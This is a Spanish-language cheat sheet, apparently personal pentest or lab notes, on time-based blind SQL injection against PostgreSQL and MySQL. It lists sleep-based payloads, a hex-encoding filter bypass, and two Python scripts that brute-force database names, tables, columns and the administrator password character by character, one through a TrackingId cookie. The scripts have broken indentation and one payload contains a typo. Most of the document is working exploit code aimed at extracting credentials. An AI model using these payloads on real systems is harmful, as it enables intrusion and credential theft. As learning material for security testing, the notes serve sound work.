# Inyección SQL Blind basado en tiempo para extraer datos 

Tags: #SQLI #Postgre_SQL  #MySQL #BurpSuite 

```mysql 
❯ ' || pg_sleep(5) -- -          # Hacer que la web tarde 5 segundos 

❯ ' %3b select pg_sleep(5) -- -
	# Se debe urlencodear '; = %3b' para que no muestre un error 

# Cuando sea true la web tardará 5 seg en responder, de lo contrario que cargue inmediatamente
❯ ' %3b select case when(1=1) then pg_sleep(5) else pg_sleep(0) end -- -   

# Si existe el usuario 'administrator' en la tabla users tardará 5 seg en responder 
❯ ' %3b select case when(username='administrator') then pg_sleep(5) else pg_sleep(0) end from users -- - 

# Si existe el usuario 'administrator' y su longitud de passwd es igual a 20 tardará 5 seg en responder 
❯ ' %3b select case when(username='administrator' and length(password)=20) then pg_sleep(5) else pg_sleep(0) end from users -- - 
``` 

```mysql 
# Para MySQL 
❯ ' or sleep(5)-- -
❯ ' and sleep(5)-- -


# Si el primer caracter del nombre de la DB es igual a 'a' tardará 2 seg en responder, de lo contrario 0
❯ 1' and if(substring(database(),1,1)='a',sleep(2), sleep(0)) -- -  
❯ ' or if(binary substring(database(),1,1)='a',sleep(2), sleep(0)) -- - 

# Usando nested queries 
❯ 1' and if(substr((select password form users where username='administrator'),1,1)='a',sleep(2), sleep(0)) -- - 


Notas:
	1. Binary funciona para que la query no sea insensitive con los caracteres 
```

## Diferentes formas de inyección 

```bash  
❯ echo -n 'H' | xxd -p           # Cambiar letras o palabras a hexadecimal 'H -> 0x48' por si hay bloqueo 
```

## Conocer la DB

```python 
#!/usr/bin/env python3

from pwn import *
import requests
import signal
import sys
import time
import string
import pdb
import urllib3    # Para peticiones HTTPS

# Evitar que salgan warnings en HTTPS a nivel de consola 
urllib3.disable_warnings()

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl + c
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "https://localhost/searchUsers.php"   # Se coloca 'Host + Ruta'
characters = string.ascii_letters + string.digits + '_-,:'  # Se puede colocar string.printable


def MakeSQLI():

    # Se agrega solo para peticiones HTTPS
    s = requests.session()
    s.verify = False 

    # Inicio normal del programa
    database = ""
    p1 = log.progress("SQLi")
    p1.status("Iniciando fuerza bruta")
    time.sleep(2)
    p2 = log.progress("Database")
    
	for position in range(1,20):
		for character in characters:
			data_post = {
				'username': "admin' and if(substr(database(),%d,1)='%s',sleep(2),sleep(0))-- -" % (position, character)
			}

			p1.status(data_post['username'])
			time_start = time.time()
			# Si es HTTPS cambiar 'requests.post' por 'r.post'
			r = requests.post(main_url, data=data_post) 
			time_end = time.time()

			if time_end - time_start > 2:
				database += character 
				p2.status(database)
				break

if __name__ == '__main__':
    MakeSQLI()

--- 
# Conocer todas las bases de datos 
test' or if(substr((select group_concat(schema_name) from information_schema.schemata),1,1)='a',sleep(2),sleep(0)) -- -

--- 
# Para conocer las tablas en una sola fila, se debe agregar la siguiente 'nested query' e incrementar el numero de la posición a 200: 
admin' and if(substr((select group_concat(table_name) from information_schema.tables where table_schema='monitors'),%d,1)='%s',sleep(2),sleep(0))-- -

---
# Para conocer las columnas 
admin' and if(substr((select group_concat(column_name) from information_schema.columns where table_schema='monitors' and table_name='users'),%d,1)='%s',sleep(2),sleep(0))-- -

---
# Para conocer las credenciales 
admin' and if(binary substr((select group_concat(username,':',password) from monitors.users),%d,1)='%s',sleep(2),sleep(0))-- -
	# BINARY = Es para hacer que sea 'case sensitive' 
```

## Conocer la password 

```mysql 
# Si la password del usuario 'administrator' es igual a 'a' tardará 5 seg en responder 
❯ ' %3b select case when(username='administrator' and substring(password,1,1)='a') then pg_sleep(2) else pg_sleep(0) end from users -- - 
```

```python 
#!/usr/bin/env python3

from pwn import *
import requests
import signal
import sys
import time
import string
import pdb


def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl + c
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "https://localhost/searchUsers.php"
characters = string.ascii_letters + string.digits    # Se puede colocar string.printable

def MakeSQLI():

    password = ""
    p1 = log.progress("SQLi")
    p1.status("Iniciando fuerza bruta")
    time.sleep(2)
    p2 = log.progress("Password")

    for position in range(1, 21):
	    for character in characters:
		    cookies = {
			    "TrackingId": "valor ' %3b select case when(username='administrator' and substring(password,%d,1)='%s') then pg_sleep(2) else pg_sleep(0) end from users -- -" % (position, character),
			    "session": "valor"           # El valor se obtiene de Burpsuite
		    }
		    p1.status(cookies['TrackingId'])
              time_start = time.time()
              r = requests.get(main_url, cookies=cookies)
              time_end = time.time()
              if time_end - time_start > 2:
                  password += character
			   p2.status(password)
			   break

if __name__ == '__main__':
    MakeSQLI()
```